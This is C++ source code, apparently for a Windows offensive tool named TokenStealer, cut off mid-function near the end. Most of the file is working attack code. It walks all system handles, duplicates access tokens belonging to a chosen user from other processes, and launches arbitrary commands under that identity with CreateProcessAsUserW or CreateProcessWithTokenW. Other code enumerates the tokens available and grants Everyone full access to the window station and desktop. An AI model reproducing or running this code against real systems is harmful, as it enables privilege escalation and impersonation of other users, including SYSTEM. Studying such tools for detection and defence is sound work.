// TokenStealer.cpp : This file contains the 'main' function. Program execution begins and ends there.
//
#include <windows.h>
#include <stdio.h>
#include <iostream>
#include <wchar.h>
#include <stdlib.h>
#include <assert.h>
#include <Psapi.h>

#pragma comment(lib,"ntdll.lib")
extern HANDLE hINPUT, hOUTPUT;
#define NT_SUCCESS(x) ((x) >= 0)
#define STATUS_INFO_LENGTH_MISMATCH 0xc0000004
#define TOKEN_PRIMARY 1
#define TOKEN_IMPERSONATION 2
#define SystemHandleInformation 16
#define ObjectBasicInformation 0
#define ObjectNameInformation 1
#define ObjectTypeInformation 2
#pragma once
#define DESKTOP_ALL (DESKTOP_CREATEMENU      | DESKTOP_CREATEWINDOW  | \
DESKTOP_ENUMERATE | DESKTOP_HOOKCONTROL | \
DESKTOP_JOURNALPLAYBACK | DESKTOP_JOURNALRECORD | \
DESKTOP_READOBJECTS | DESKTOP_SWITCHDESKTOP |  \
DESKTOP_WRITEOBJECTS | DELETE | \
READ_CONTROL | WRITE_DAC |\
WRITE_OWNER)
#define WINSTA_ALL (WINSTA_ACCESSCLIPBOARD  | WINSTA_ACCESSGLOBALATOMS | \
WINSTA_CREATEDESKTOP | WINSTA_ENUMDESKTOPS | \
WINSTA_ENUMERATE | WINSTA_EXITWINDOWS | \
WINSTA_READATTRIBUTES | WINSTA_READSCREEN | \
WINSTA_WRITEATTRIBUTES | DELETE |\
READ_CONTROL | WRITE_DAC | \
WRITE_OWNER)
#define GENERIC_ACCESS (GENERIC_READ    | GENERIC_WRITE |GENERIC_EXECUTE | GENERIC_ALL)
void CreateProcessWithPipeComm(HANDLE token, wchar_t* command);
BOOL HasAssignPriv = FALSE;
BOOL Interactive = TRUE;
wchar_t* User_to_impersonate = NULL;
static int num = 0;
int TokenTypeNeeded = 0;
BOOL ForceImpersonation = FALSE;
wchar_t WinStationName[256];
wchar_t** TokenUsers = NULL; // Global ar\ray to store TokenUsers
int num_TokenUsers = 0; // Number of TokenUsers currently in the array
int max_TokenUsers = 0; // Maximum number of TokenUsers that can be stored in the array
typedef NTSTATUS(NTAPI* _NtQuerySystemInformation)(
	ULONG SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength
	);
typedef NTSTATUS(NTAPI* _NtDuplicateObject)(
	HANDLE SourceProcessHandle,
	HANDLE SourceHandle,
	HANDLE TargetProcessHandle,
	PHANDLE TargetHandle,
	ACCESS_MASK DesiredAccess,
	ULONG Attributes,
	ULONG Options
	);
typedef NTSTATUS(NTAPI* _NtQueryObject)(
	HANDLE ObjectHandle,
	ULONG ObjectInformationClass,
	PVOID ObjectInformation,
	ULONG ObjectInformationLength,
	PULONG ReturnLength
	);

typedef struct _UNICODE_STRING
{
	USHORT Length;
	USHORT MaximumLength;
	PWSTR Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _SYSTEM_HANDLE
{
	ULONG ProcessId;
	BYTE ObjectTypeNumber;
	BYTE Flags;
	USHORT Handle;
	PVOID Object;
	ACCESS_MASK GrantedAccess;
} SYSTEM_HANDLE, * PSYSTEM_HANDLE;

typedef struct _SYSTEM_HANDLE_INFORMATION
{
	ULONG HandleCount;
	SYSTEM_HANDLE Handles[1];
} SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;

typedef enum _POOL_TYPE
{
	NonPagedPool,
	PagedPool,
	NonPagedPoolMustSucceed,
	DontUseThisType,
	NonPagedPoolCacheAligned,
	PagedPoolCacheAligned,
	NonPagedPoolCacheAlignedMustS
} POOL_TYPE, * PPOOL_TYPE;

typedef struct _OBJECT_TYPE_INFORMATION
{
	UNICODE_STRING Name;
	ULONG TotalNumberOfObjects;
	ULONG TotalNumberOfHandles;
	ULONG TotalPagedPoolUsage;
	ULONG TotalNonPagedPoolUsage;
	ULONG TotalNamePoolUsage;
	ULONG TotalHandleTableUsage;
	ULONG HighWaterNumberOfObjects;
	ULONG HighWaterNumberOfHandles;
	ULONG HighWaterPagedPoolUsage;
	ULONG HighWaterNonPagedPoolUsage;
	ULONG HighWaterNamePoolUsage;
	ULONG HighWaterHandleTableUsage;
	ULONG InvalidAttributes;
	GENERIC_MAPPING GenericMapping;
	ULONG ValidAccess;
	BOOLEAN SecurityRequired;
	BOOLEAN MaintainHandleCount;
	USHORT MaintainTypeList;
	POOL_TYPE PoolType;
	ULONG PagedPoolUsage;
	ULONG NonPagedPoolUsage;
} OBJECT_TYPE_INFORMATION, * POBJECT_TYPE_INFORMATION;

typedef struct _SYSTEM_PROCESS_INFO
{
	ULONG                   NextEntryOffset;
	ULONG                   NumberOfThreads;
	LARGE_INTEGER           Reserved[3];
	LARGE_INTEGER           CreateTime;
	LARGE_INTEGER           UserTime;
	LARGE_INTEGER           KernelTime;
	UNICODE_STRING          ImageName;
	ULONG                   BasePriority;
	HANDLE                  ProcessId;
	HANDLE                  InheritedFromProcessId;
}SYSTEM_PROCESS_INFO, * PSYSTEM_PROCESS_INFO;

PVOID GetLibraryProcAddress(PSTR LibraryName, PSTR ProcName)
{
	return GetProcAddress(GetModuleHandleA(LibraryName), ProcName);
}

BOOL EnablePriv(HANDLE hToken, LPCTSTR priv)
{
	TOKEN_PRIVILEGES tp;
	LUID luid;

	if (!LookupPrivilegeValue(NULL, priv, &luid))
	{
		printf("Priv Lookup FALSE\n");
		return FALSE;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	if (!AdjustTokenPrivileges(
		hToken,
		FALSE,
		&tp,
		sizeof(TOKEN_PRIVILEGES),
		(PTOKEN_PRIVILEGES)NULL,
		(PDWORD)NULL))
	{
		printf("Priv Adjust FALSE\n");
		return FALSE;
	}
	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)

	{
		//printf("The token does not have the specified privilege. \n");
		return FALSE;
	}

	return TRUE;
}
int IsTokenSystem2(HANDLE tok, int* deleg)
{
	DWORD Size;
	TOKEN_USER* User;
	PSID pSID = NULL;
	LPVOID TokenImpersonationInfo[256];

	SID_IDENTIFIER_AUTHORITY SIDAuth = SECURITY_NT_AUTHORITY;
	if (!AllocateAndInitializeSid(&SIDAuth, 1,
		SECURITY_LOCAL_SYSTEM_RID,
		0, 0, 0, 0, 0, 0, 0,
		&pSID))
		return FALSE;

	Size = 0;
	GetTokenInformation(tok, TokenUser, NULL, 0, &Size);
	BOOL ret = FALSE;
	if (!Size)
		return FALSE;

	User = (TOKEN_USER*)malloc(Size);

	GetTokenInformation(tok, TokenUser, User, Size, &Size);

	if (EqualSid(pSID, User->User.Sid)) {

		ret = TRUE;
	}
	if (GetTokenInformation(tok, TokenImpersonationLevel, TokenImpersonationInfo, 256, &Size))
	{
		if (*((SECURITY_IMPERSONATION_LEVEL*)TokenImpersonationInfo) == SecurityDelegation)
			*deleg = 1;
		else
			*deleg = 0;
	}
	free(User);
	free(pSID);
	return ret;
}
int GetTokenUser(HANDLE tok, wchar_t* SamAccount)
{
	DWORD Size, UserSize, DomainSize;
	SID* sid;
	SID_NAME_USE SidType;
	TCHAR UserName[64], DomainName[64];
	//TCHAR SamAccount[128];
	TOKEN_USER* User;
	Size = 0;
	GetTokenInformation(tok, TokenUser, NULL, 0, &Size);
	if (!Size)
		return FALSE;

	User = (TOKEN_USER*)malloc(Size);
	assert(User);
	assert(User);
	GetTokenInformation(tok, TokenUser, User, Size, &Size);
	assert(Size);
	Size = GetLengthSid(User->User.Sid);
	assert(Size);
	sid = (SID*)malloc(Size);
	assert(sid);

	CopySid(Size, sid, User->User.Sid);
	UserSize = (sizeof UserName / sizeof * UserName) - 1;
	DomainSize = (sizeof DomainName / sizeof * DomainName) - 1;
	LookupAccountSid(NULL, sid, UserName, &UserSize, DomainName, &DomainSize, &SidType);
	free(sid);

	swprintf(SamAccount, 128, L"%s\\%s", DomainName, UserName);


	return 1;
}

int TokenLevel(HANDLE token, SECURITY_IMPERSONATION_LEVEL* ImpersonationLevel)
{


	TOKEN_TYPE Type;
	DWORD returned_tokinfo_length;
	//SECURITY_IMPERSONATION_LEVEL ImpersonationLevel;
	*ImpersonationLevel = (SECURITY_IMPERSONATION_LEVEL)0;
	if (!GetTokenInformation(token, TokenType, &Type, sizeof(TOKEN_TYPE), &returned_tokinfo_length))
		return -1;
	if (Type == TokenPrimary)
	{

		return 1;
	}
	if (GetTokenInformation(token, TokenImpersonationLevel, ImpersonationLevel, sizeof(SECURITY_IMPERSONATION_LEVEL), &returned_tokinfo_length))
	{

		
		if (*ImpersonationLevel == SecurityDelegation)
		{
		
			return 2;
		}
		else
			return 2;

		
	}
	return -1;

}



int IsValidToken(HANDLE tok)
{
	DWORD Size, UserSize, DomainSize;
	SID* sid;
	SID_NAME_USE SidType;
	TCHAR UserName[64], DomainName[64];
	TCHAR SamAccount[128];
	TOKEN_USER* User;
	

	Size = 0;
	GetTokenInformation(tok, TokenUser, NULL, 0, &Size);
	if (!Size)
		return FALSE;
	//return 0;
	User = (TOKEN_USER*)malloc(Size);
	//assert(User);
	assert(User);
	GetTokenInformation(tok, TokenUser, User, Size, &Size);
	//assert(Size);
	Size = GetLengthSid(User->User.Sid);
	assert(Size);
	sid = (SID*)malloc(Size);
	assert(sid);

	CopySid(Size, sid, User->User.Sid);

	UserSize = (sizeof UserName / sizeof * UserName) - 1;
	DomainSize = (sizeof DomainName / sizeof * DomainName) - 1;
	LookupAccountSid(NULL, sid, UserName, &UserSize, DomainName, &DomainSize, &SidType);
	free(sid);
	free(User);

	swprintf(SamAccount, 128, L"%s\\%s", DomainName, UserName);


	if (!_wcsicmp(SamAccount, User_to_impersonate))
	{

		
		return 1;
	}
	return 0;

}





int ExecuteWithToken(wchar_t* command, ULONG pid)
{
	_NtQuerySystemInformation NtQuerySystemInformation =
		(_NtQuerySystemInformation)GetLibraryProcAddress((PSTR)"ntdll.dll", (PSTR)"NtQuerySystemInformation");
	_NtDuplicateObject NtDuplicateObject =
		(_NtDuplicateObject)GetLibraryProcAddress((PSTR)"ntdll.dll", (PSTR)"NtDuplicateObject");
	_NtQueryObject NtQueryObject =
		(_NtQueryObject)GetLibraryProcAddress((PSTR)"ntdll.dll", (PSTR)"NtQueryObject");
	NTSTATUS status;
	PSYSTEM_HANDLE_INFORMATION handleInfo;
	ULONG handleInfoSize = 0x10000;

	HANDLE processHandle;
	ULONG i;
	
	STARTUPINFOW si;
	PROCESS_INFORMATION pi;
	BOOL b1, b2;
	
	
	HANDLE dupHandle = NULL;
	POBJECT_TYPE_INFORMATION objectTypeInfo;
	
	
	
	HANDLE pToken1, pToken2;
	
	BOOL success = FALSE;
	int deleg = 0;
	SECURITY_IMPERSONATION_LEVEL ImpersonationLevel;
	

	//wsprintf(desktop, L"%s\\default", WinStationName);
	ZeroMemory(&si, sizeof(STARTUPINFO));
	si.cb = sizeof(STARTUPINFO);
	if (!(processHandle = OpenProcess(MAXIMUM_ALLOWED, FALSE, pid)))
	{
		//printf("[-] Could not open PID %d %d!)\n", pid, GetLastError());

		return 0;
	}


	handleInfo = (PSYSTEM_HANDLE_INFORMATION)malloc(handleInfoSize);
	while ((status = NtQuerySystemInformation(
		SystemHandleInformation,
		handleInfo,
		handleInfoSize,
		NULL
	)) == STATUS_INFO_LENGTH_MISMATCH)
		handleInfo = (PSYSTEM_HANDLE_INFORMATION)realloc(handleInfo, handleInfoSize *= 2);
	if (!NT_SUCCESS(status))
	{
		printf("NtQuerySystemInformation failed!\n");
		return 0;
	}
	success = FALSE;

	for (i = 0; i < handleInfo->HandleCount; i++)
	{
		SYSTEM_HANDLE handle = handleInfo->Handles[i];


		//if (handle.ProcessId != pid)
			//continue;

		if (DuplicateHandle(processHandle, (HANDLE)handle.Handle,
			GetCurrentProcess(), &dupHandle,
			MAXIMUM_ALLOWED, FALSE, 0x02) == FALSE)
		{
			//printf("[-] Error Dup Handle!%d\n", GetLastError());

			continue;
		}


		objectTypeInfo = (POBJECT_TYPE_INFORMATION)malloc(0x1000);
		if (!NT_SUCCESS(NtQueryObject(
			dupHandle,
			ObjectTypeInformation,
			objectTypeInfo,
			0x1000,
			NULL
		)))
		{
			//printf("[-] Error NtQueryObject %d!\n",GetLastError());

			CloseHandle(dupHandle);
			continue;
		}

		if (!wcsncmp(objectTypeInfo->Name.Buffer, L"Token", objectTypeInfo->Name.Length / 2))
		{


			if (IsValidToken((HANDLE)dupHandle))// && ImpersonateLoggedOnUser(dupHandle) != 0)
			{

				int bl = TokenLevel(dupHandle, &ImpersonationLevel);
				if (bl == -1)
					continue;
				if (TokenTypeNeeded == TOKEN_PRIMARY && bl != TOKEN_PRIMARY)
					continue;
				
				if(TokenTypeNeeded >1)
				{
					if (ImpersonationLevel != TokenTypeNeeded)
					{


						continue;
					}
				}
				if (bl == TOKEN_PRIMARY)
					printf("[+] Got %S Primary Token in pid: %d\n", User_to_impersonate, pid);
				else
					printf("[+] Got %S Impersonation Token in pid: %d with Impersonation Level: %d %s\n", User_to_impersonate, pid, ImpersonationLevel, ImpersonationLevel > 1 ? "OK" : "KO");
				if (ImpersonationLevel > SecurityIdentification || bl == TOKEN_PRIMARY)
				{
					if (!DuplicateTokenEx(dupHandle, TOKEN_ALL_ACCESS, NULL, SecurityDelegation, TokenPrimary, &pToken1))
					{
						printf("[-] Error duplicating Primary Token:%d\n", GetLastError());
						break;

					}
					if (!DuplicateTokenEx(dupHandle, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenImpersonation, &pToken2))
					{
						printf("[-] Error duplicating ImpersonationToken:%d\n", GetLastError());
						break;

					}



					if (HasAssignPriv && !ForceImpersonation)
					{

						printf("[*] Token has SE_ASSIGN_PRIMARY_NAME, using CreateProcessAsUser() for launching: %S\n", command);
						b1 = CreateProcessAsUserW(
							pToken1,            // client's access token
							NULL,              // file to execute
							command,     // command line
							NULL,              // pointer to process SECURITY_ATTRIBUTES
							NULL,              // pointer to thread SECURITY_ATTRIBUTES
							FALSE,             // handles are not inheritable
							0,   // creation flags
							NULL,              // pointer to new environment block
							NULL,              // name of current directory
							&si,               // pointer to STARTUPINFO structure
							&pi                // receives information about new process
						);

						//debug
						printf("[*] Result: %s %d\n", b1 ? "TRUE" : "FALSE", GetLastError());
						WaitForSingleObject(pi.hProcess, INFINITE);
						if (b1)
						{
							success = TRUE;
							break;
						}


					}
					else
					{
						printf("[*] Token does NOT have SE_ASSIGN_PRIMARY_NAME, using CreateProcessAsWithToken() for launching: %S\n", command);

						
						//RevertToSelf();

						b2 = CreateProcessWithTokenW(pToken2,
							0,
							NULL,
							command,
							CREATE_NO_WINDOW,
							NULL,
							NULL,
							&si,
							&pi);
						//debug
						printf("[*] Result: %s (%d)\n", b2 ? "TRUE" : "FALSE", GetLastError());
						if (b2)
						{
							success = TRUE;
							break;
						}



					}
				}
			}
		}
		free(objectTypeInfo);
		CloseHandle(dupHandle);

	}

	free(handleInfo);
	CloseHandle(processHandle);

	return success;
}
int compare_strings(const void* a, const void* b) {
	return wcscmp(*(const wchar_t**)a, *(const wchar_t**)b);
}
void add_string(wchar_t* new_string) {
	// Check if the string is already in the array
	for (int i = 0; i < num_TokenUsers; i++) {
		if (wcscmp(TokenUsers[i], new_string) == 0) {
			// String is already in the array, so return without adding it again
			return;
		}
	}

	// String is not in the array, so add it to the end
	if (num_TokenUsers >= max_TokenUsers) {
		// If the array is full, double its size
		max_TokenUsers = max_TokenUsers == 0 ? 1 : max_TokenUsers * 2;
		TokenUsers = (wchar_t**)realloc(TokenUsers, max_TokenUsers * sizeof(char*));
	}
	TokenUsers[num_TokenUsers] = _wcsdup(new_string);
	num_TokenUsers++;
	qsort(TokenUsers, num_TokenUsers, sizeof(wchar_t*), compare_strings);
}
int ListTokens(ULONG pid, BOOL extended_list)
{
	_NtQuerySystemInformation NtQuerySystemInformation =
		(_NtQuerySystemInformation)GetLibraryProcAddress((PSTR)"ntdll.dll", (PSTR)"NtQuerySystemInformation");
	_NtDuplicateObject NtDuplicateObject =
		(_NtDuplicateObject)GetLibraryProcAddress((PSTR)"ntdll.dll", (PSTR)"NtDuplicateObject");
	_NtQueryObject NtQueryObject =
		(_NtQueryObject)GetLibraryProcAddress((PSTR)"ntdll.dll", (PSTR)"NtQueryObject");
	NTSTATUS status;
	PSYSTEM_HANDLE_INFORMATION handleInfo;
	ULONG handleInfoSize = 0x10000;

	HANDLE processHandle;
	ULONG i;
	
	POBJECT_TYPE_INFORMATION objectTypeInfo;
	
	
	
	BOOL success = FALSE;
	HANDLE dupHandle;
	wchar_t SamAccount[128];
	wchar_t SamAccountPid[256];
	SECURITY_IMPERSONATION_LEVEL ImpersonationLevel;

	if (!(processHandle = OpenProcess(MAXIMUM_ALLOWED, FALSE, pid)))
	{
		
		

		return 0;
	}

	handleInfo = (PSYSTEM_HANDLE_INFORMATION)malloc(handleInfoSize);
	while ((status = NtQuerySystemInformation(
		SystemHandleInformation,
		handleInfo,
		handleInfoSize,
		NULL
	)) == STATUS_INFO_LENGTH_MISMATCH)
		handleInfo = (PSYSTEM_HANDLE_INFORMATION)realloc(handleInfo, handleInfoSize *= 2);
	if (!NT_SUCCESS(status))
	{
		printf("NtQuerySystemInformation failed!\n");
		return 0;
	}

	for (i = 0; i < handleInfo->HandleCount; i++)
	{
		SYSTEM_HANDLE handle = handleInfo->Handles[i];


		if (handle.ProcessId != pid)
			continue;

		if (DuplicateHandle(processHandle, (HANDLE)handle.Handle,
			GetCurrentProcess(), &dupHandle,
			MAXIMUM_ALLOWED, FALSE, 0x02) == FALSE)
		{
			//printf("[-] Error Dup Handle!%d\n", GetLastError());

			continue;
		}


		objectTypeInfo = (POBJECT_TYPE_INFORMATION)malloc(0x1000);
		if (!NT_SUCCESS(NtQueryObject(
			dupHandle,
			ObjectTypeInformation,
			objectTypeInfo,
			0x1000,
			NULL
		)))
		{
			//printf("[-] Error NtQueryObject %d!\n",GetLastError());

			CloseHandle(dupHandle);
			continue;
		}

		if (!wcsncmp(objectTypeInfo->Name.Buffer, L"Token", objectTypeInfo->Name.Length / 2))
		{
			int bl = TokenLevel(dupHandle, &ImpersonationLevel);
			
			if (bl == -1)
				continue;
			if (TokenTypeNeeded == TOKEN_PRIMARY)
			{
				if (bl != TOKEN_PRIMARY)
					continue;
				

			}
			if (TokenTypeNeeded >  TOKEN_PRIMARY)
			{
				if (ImpersonationLevel != TokenTypeNeeded)
				{


					continue;
				}
			}
			
			GetTokenUser(dupHandle, SamAccount);
			if (extended_list)
			{

					if (bl == TOKEN_PRIMARY)
						wsprintf((wchar_t*)SamAccountPid, L"%s:(P):%d", (wchar_t*)SamAccount, pid);
					else
						wsprintf((wchar_t*)SamAccountPid, L"%s:%d:%d", (wchar_t*)SamAccount, ImpersonationLevel, pid);
					add_string(SamAccountPid);
			}
			else
				add_string(SamAccount);

			
		}
		free(objectTypeInfo);
		CloseHandle(dupHandle);
	}

	free(handleInfo);
	CloseHandle(processHandle);

	return success;
}

DWORD GetServicePid(wchar_t* serviceName)
{
	const auto hScm = OpenSCManager(nullptr, nullptr, NULL);
	const auto hSc = OpenService(hScm, serviceName, SERVICE_QUERY_STATUS);

	SERVICE_STATUS_PROCESS ssp = {};
	DWORD bytesNeeded = 0;
	QueryServiceStatusEx(hSc, SC_STATUS_PROCESS_INFO, reinterpret_cast<LPBYTE>(&ssp), sizeof(ssp), &bytesNeeded);

	CloseServiceHandle(hSc);
	CloseServiceHandle(hScm);

	return ssp.dwProcessId;
}
BOOL AddTheAceWindowStation(HWINSTA hwinsta, PSID psid)
{

	ACCESS_ALLOWED_ACE* pace = NULL;
	ACL_SIZE_INFORMATION aclSizeInfo;
	BOOL                 bDaclExist;
	BOOL                 bDaclPresent;
	BOOL                 bSuccess = FALSE; // assume function will
	//fail
	DWORD                dwNewAclSize;
	DWORD                dwSidSize = 0;
	DWORD                dwSdSizeNeeded;
	PACL                 pacl;
	PACL                 pNewAcl = NULL;
	PSECURITY_DESCRIPTOR psd = NULL;
	PSECURITY_DESCRIPTOR psdNew = NULL;
	PVOID                pTempAce;
	SECURITY_INFORMATION si = DACL_SECURITY_INFORMATION;
	unsigned int         i;

	__try
	{
		if (!GetUserObjectSecurity(
			hwinsta,
			&si,
			psd,
			dwSidSize,
			&dwSdSizeNeeded
		))
			if (GetLastError() == ERROR_INSUFFICIENT_BUFFER)
			{
				psd = (PSECURITY_DESCRIPTOR)HeapAlloc(
					GetProcessHeap(),
					HEAP_ZERO_MEMORY,
					dwSdSizeNeeded
				);
				if (psd == NULL)
					__leave;

				psdNew = (PSECURITY_DESCRIPTOR)HeapAlloc(
					GetProcessHeap(),
					HEAP_ZERO_MEMORY,
					dwSdSizeNeeded
				);
				if (psdNew == NULL)
					__leave;

				dwSidSize = dwSdSizeNeeded;

				if (!GetUserObjectSecurity(
					hwinsta,
					&si,
					psd,
					dwSidSize,
					&dwSdSizeNeeded
				))
					__leave;
			}
			else
				__leave;

		if (!InitializeSecurityDescriptor(
			psdNew,
			SECURITY_DESCRIPTOR_REVISION
		))
			__leave;

		if (!GetSecurityDescriptorDacl(
			psd,
			&bDaclPresent,
			&pacl,
			&bDaclExist
		))
			__leave;

		ZeroMemory(&aclSizeInfo, sizeof(ACL_SIZE_INFORMATION));
		aclSizeInfo.AclBytesInUse = sizeof(ACL);
		if (pacl != NULL)
		{
			if (!GetAclInformation(
				pacl,
				(LPVOID)&aclSizeInfo,
				sizeof(ACL_SIZE_INFORMATION),
				AclSizeInformation
			))
				__leave;
		}

		dwNewAclSize = aclSizeInfo.AclBytesInUse + (2 *
			sizeof(ACCESS_ALLOWED_ACE)) + (2 * GetLengthSid(psid)) - (2 *
				sizeof(DWORD));
		pNewAcl = (PACL)HeapAlloc(
			GetProcessHeap(),
			HEAP_ZERO_MEMORY,
			dwNewAclSize
		);
		if (pNewAcl == NULL)
			__leave;

		if (!InitializeAcl(pNewAcl, dwNewAclSize, ACL_REVISION))
			__leave;

		if (bDaclPresent)
		{

			if (aclSizeInfo.AceCount)
			{
				for (i = 0; i < aclSizeInfo.AceCount; i++)
				{
					// get an ACE
					if (!GetAce(pacl, i, &pTempAce))
						__leave;

					// add the ACE to the new ACL
					if (!AddAce(
						pNewAcl,
						ACL_REVISION,
						MAXDWORD,
						pTempAce,
						((PACE_HEADER)pTempAce)->AceSize
					))
						__leave;
				}
			}
		}

		// 
		// add the first ACE to the windowstation
		// 
		pace = (ACCESS_ALLOWED_ACE*)HeapAlloc(
			GetProcessHeap(),
			HEAP_ZERO_MEMORY,
			sizeof(ACCESS_ALLOWED_ACE) + GetLengthSid(psid) -
			sizeof(DWORD
				));
		if (pace == NULL)
			__leave;

		pace->Header.AceType = ACCESS_ALLOWED_ACE_TYPE;
		pace->Header.AceFlags = CONTAINER_INHERIT_ACE |
			INHERIT_ONLY_ACE |

			OBJECT_INHERIT_ACE;
		pace->Header.AceSize = sizeof(ACCESS_ALLOWED_ACE) +

			GetLengthSid(psid) - sizeof(DWORD);
		pace->Mask = GENERIC_ACCESS;

		if (!CopySid(GetLengthSid(psid), &pace->SidStart, psid))
			__leave;

		if (!AddAce(
			pNewAcl,
			ACL_REVISION,
			MAXDWORD,
			(LPVOID)pace,
			pace->Header.AceSize
		))
			__leave;

		// 
		// add the second ACE to the windowstation
		// 
		pace->Header.AceFlags = NO_PROPAGATE_INHERIT_ACE;
		pace->Mask = WINSTA_ALL;

		if (!AddAce(
			pNewAcl,
			ACL_REVISION,
			MAXDWORD,
			(LPVOID)pace,
			pace->Header.AceSize
		))
			__leave;

		// 
		// set new dacl for the security descriptor
		// 
		if (!SetSecurityDescriptorDacl(
			psdNew,
			TRUE,
			pNewAcl,
			FALSE
		))
			__leave;

		// 
// set the new security descriptor for the windowstation
// 
		if (!SetUserObjectSecurity(hwinsta, &si, psdNew))
			__leave;

		// 
		// indicate success
		// 
		bSuccess = TRUE;
	}
	__finally
	{
		// 
		// free the allocated buffers
		// 
		if (pace != NULL)
			HeapFree(GetProcessHeap(), 0, (LPVOID)pace);

		if (pNewAcl != NULL)
			HeapFree(GetProcessHeap(), 0, (LPVOID)pNewAcl);

		if (psd != NULL)
			HeapFree(GetProcessHeap(), 0, (LPVOID)psd);

		if (psdNew != NULL)
			HeapFree(GetProcessHeap(), 0, (LPVOID)psdNew);
	}

	return bSuccess;

}

BOOL AddTheAceDesktop(HDESK hdesk, PSID psid)
{

	ACL_SIZE_INFORMATION aclSizeInfo;
	BOOL                 bDaclExist;
	BOOL                 bDaclPresent;
	BOOL                 bSuccess = FALSE; // assume function will
	// fail
	DWORD                dwNewAclSize;
	DWORD                dwSidSize = 0;
	DWORD                dwSdSizeNeeded;
	PACL                 pacl;
	PACL                 pNewAcl = NULL;
	PSECURITY_DESCRIPTOR psd = NULL;
	PSECURITY_DESCRIPTOR psdNew = NULL;
	PVOID                pTempAce;
	SECURITY_INFORMATION si = DACL_SECURITY_INFORMATION;
	unsigned int         i;

	__try
	{
		// 
		// obtain the security descriptor for the desktop object
		// 
		if (!GetUserObjectSecurity(
			hdesk,
			&si,
			psd,
			dwSidSize,
			&dwSdSizeNeeded
		))
		{
			if (GetLastError() == ERROR_INSUFFICIENT_BUFFER)
			{
				psd = (PSECURITY_DESCRIPTOR)HeapAlloc(
					GetProcessHeap(),
					HEAP_ZERO_MEMORY,
					dwSdSizeNeeded
				);
				if (psd == NULL)
					__leave;

				psdNew = (PSECURITY_DESCRIPTOR)HeapAlloc(
					GetProcessHeap(),
					HEAP_ZERO_MEMORY,
					dwSdSizeNeeded
				);
				if (psdNew == NULL)
					__leave;

				dwSidSize = dwSdSizeNeeded;

				if (!GetUserObjectSecurity(
					hdesk,
					&si,
					psd,
					dwSidSize,
					&dwSdSizeNeeded
				))
					__leave;
			}
			else
				__leave;
		}

		// 
		// create a new security descriptor
		// 
		if (!InitializeSecurityDescriptor(
			psdNew,
			SECURITY_DESCRIPTOR_REVISION
		))
			__leave;

		// 
		// obtain the dacl from the security descriptor
		// 
		if (!GetSecurityDescriptorDacl(
			psd,
			&bDaclPresent,
			&pacl,
			&bDaclExist
		))
			__leave;

		// 
		// initialize
		// 
		ZeroMemory(&aclSizeInfo, sizeof(ACL_SIZE_INFORMATION));
		aclSizeInfo.AclBytesInUse = sizeof(ACL);

		// 
		// call only if NULL dacl
		// 
		if (pacl != NULL)
		{
			// 
			// determine the size of the ACL info
			// 
			if (!GetAclInformation(
				pacl,
				(LPVOID)&aclSizeInfo,
				sizeof(ACL_SIZE_INFORMATION),
				AclSizeInformation
			))
				__leave;
		}

		// 
		// compute the size of the new acl
		// 
		dwNewAclSize = aclSizeInfo.AclBytesInUse +
			sizeof(ACCESS_ALLOWED_ACE) +
			GetLengthSid(psid) - sizeof(DWORD);

		// 
		// allocate buffer for the new acl
		// 
		pNewAcl = (PACL)HeapAlloc(
			GetProcessHeap(),
			HEAP_ZERO_MEMORY,
			dwNewAclSize
		);
		if (pNewAcl == NULL)
			__leave;

		// 
		// initialize the new acl
		// 
		if (!InitializeAcl(pNewAcl, dwNewAclSize, ACL_REVISION))
			__leave;

		// 
		// if DACL is present, copy it to a new DACL
		// 
		if (bDaclPresent) // only copy if DACL was present
		{
			// copy the ACEs to our new ACL
			if (aclSizeInfo.AceCount)
			{
				for (i = 0; i < aclSizeInfo.AceCount; i++)
				{
					// get an ACE
					if (!GetAce(pacl, i, &pTempAce))
						__leave;

					// add the ACE to the new ACL
					if (!AddAce(
						pNewAcl,
						ACL_REVISION,
						MAXDWORD,
						pTempAce,
						((PACE_HEADER)pTempAce)->AceSize
					))
						__leave;
				}
			}
		}

		// 
		// add ace to the dacl
		// 
		if (!AddAccessAllowedAce(
			pNewAcl,
			ACL_REVISION,
			DESKTOP_ALL,
			psid
		))
			__leave;

		// 
		// set new dacl to the new security descriptor
		// 
		if (!SetSecurityDescriptorDacl(
			psdNew,
			TRUE,
			pNewAcl,
			FALSE
		))
			__leave;

		// 
		// set the new security descriptor for the desktop object
		// 
		if (!SetUserObjectSecurity(hdesk, &si, psdNew))
			__leave;

		// 
		// indicate success
		// 
		bSuccess = TRUE;
	}
	__finally
	{
		// 
		// free buffers
		// 
		if (pNewAcl != NULL)
			HeapFree(GetProcessHeap(), 0, (LPVOID)pNewAcl);

		if (psd != NULL)
			HeapFree(GetProcessHeap(), 0, (LPVOID)psd);

		if (psdNew != NULL)
			HeapFree(GetProcessHeap(), 0, (LPVOID)psdNew);
	}

	return bSuccess;
}

PSID BuildEveryoneSid() {
	SID_IDENTIFIER_AUTHORITY auth = SECURITY_WORLD_SID_AUTHORITY;
	PSID pSID = NULL;
	BOOL fSuccess = AllocateAndInitializeSid(&auth, 1,
		SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0, &pSID);
	return(fSuccess ? pSID : NULL);
}
void SetWinDesktopPerms()
{
	HWINSTA hwinstaold = GetProcessWindowStation();
	DWORD lengthNeeded;
	memset(WinStationName, 0, sizeof(WinStationName));
	GetUserObjectInformationW(hwinstaold, UOI_NAME, WinStationName, 256, &lengthNeeded);



	HWINSTA hwinsta = OpenWindowStationW(WinStationName, FALSE, READ_CONTROL | WRITE_DAC);

	if (!SetProcessWindowStation(hwinsta))
		printf("[-] Error SetProcessWindowStation:%d\n", GetLastError());

	HDESK hdesk = OpenDesktop(
		L"default",
		0,
		FALSE,
		READ_CONTROL | WRITE_DAC |
		DESKTOP_WRITEOBJECTS | DESKTOP_READOBJECTS
	);
	if (hdesk == NULL)
		printf("[-] Error open Desktop:%d\n", GetLastError());
	if (!SetProcessWindowStation(hwinstaold))
		printf("[-] Error SetProcessWindowStation2:%d\n", GetLastError());


	PSID psid = BuildEveryoneSid();
	
	if (!AddTheAceWindowStation(hwinstaold, psid))
		printf("[-] Error add Ace Station:%d\n", GetLastError());
